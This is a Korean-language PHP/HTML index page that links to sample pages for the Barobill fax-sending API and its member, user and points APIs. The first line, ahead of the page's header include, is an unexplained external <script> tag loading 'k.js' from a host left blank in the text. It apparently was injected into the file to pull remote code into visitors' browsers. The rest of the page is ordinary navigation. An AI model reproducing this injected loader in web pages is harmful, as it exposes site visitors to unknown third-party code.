<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>팩스전송 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>전송</legend>
		<ul>
			<li><a href="API_FAX/SendFaxFromFTP.php">SendFaxFromFTP</a> - 전송 (단일파일)</li>
			<li><a href="API_FAX/SendFaxFromFTPEx.php">SendFaxFromFTPEx</a> - 전송 (다량파일)</li>
			<li><a href="API_FAX/SendFaxesFromFTP.php">SendFaxesFromFTP</a> - 다량전송 (단일파일)</li>
			<li><a href="API_FAX/SendFaxesFromFTPEx.php">SendFaxesFromFTPEx</a> - 다량전송 (다량파일)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>예약 취소</legend>
		<ul>
			<li><a href="API_FAX/CancelReservedFaxMessage.php">CancelReservedFaxMessage</a> - 예약 전송취소</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>정보</legend>
		<ul>
			<li><a href="API_FAX/GetFaxSendState.php">GetFaxSendState</a> - 팩스 전송 상태 (바로빌부여 전송키)</li>
			<li><a href="API_FAX/GetFaxMessage.php">GetFaxMessage</a> - 팩스 확인A (바로빌부여 전송키)</li>
			<li><a href="API_FAX/GetFaxMessageEx.php">GetFaxMessageEx</a> - 팩스 확인B (바로빌부여 전송키)</li>
			<li><a href="API_FAX/GetFaxSendMessages.php">GetFaxSendMessages</a> - 팩스 대량확인A (바로빌부여 전송키)</li>
			<li><a href="API_FAX/GetFaxSendMessagesEx.php">GetFaxSendMessagesEx</a> - 팩스 대량확인B (바로빌부여 전송키)</li>
			<li><a href="API_FAX/GetFaxSendMessagesByRefKey.php">GetFaxSendMessagesByRefKey</a> - 팩스 확인A (연동사부여 전송키)</li>
			<li><a href="API_FAX/GetFaxSendMessagesByRefKeyEx.php">GetFaxSendMessagesByRefKeyEx</a> - 팩스 확인B (연동사부여 전송키)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>URL 관련</legend>
		<ul>
			<li><a href="API_FAX/GetFaxHistoryURL.php">GetFaxHistoryURL</a> - 팩스 전송내역 URL</li>
			<li><a href="API_FAX/GetFaxFileURL.php">GetFaxFileURL</a> - 팩스 파일 다운로드 URL</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
			<li><a href="API_BAROBILL/GetBalanceCostAmountOfInterOP.php">GetBalanceCostAmountOfInterOP</a> - 연동사포인트 확인</li>
			<li><a href="API_BAROBILL/GetChargeUnitCost.php">GetChargeUnitCost</a> - 요금 단가 확인</li>
			<li><a href="API_BAROBILL/CheckChargeable.php">CheckChargeable</a> - 과금 가능여부 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>